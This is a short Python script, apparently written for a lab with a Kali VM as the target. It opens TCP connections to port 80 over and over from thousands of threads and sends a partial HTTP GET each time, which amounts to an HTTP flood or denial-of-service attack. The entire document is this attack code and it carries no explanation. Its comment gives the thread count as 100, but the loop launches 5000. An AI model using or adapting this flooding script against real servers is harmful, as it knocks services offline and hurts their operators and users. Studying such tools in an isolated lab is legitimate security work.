import socket
import threading

target_ip = "192.168.29.75"  # Replace with your Kali VM IP
target_port = 80

def attack():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target_ip, target_port))
            s.sendto(("GET / HTTP/1.1\r\n").encode('ascii'), (target_ip, target_port))
            s.close()
        except:
            pass

# Start 100 threads to simulate a flood
for i in range(5000):
    thread = threading.Thread(target=attack)
    thread.start()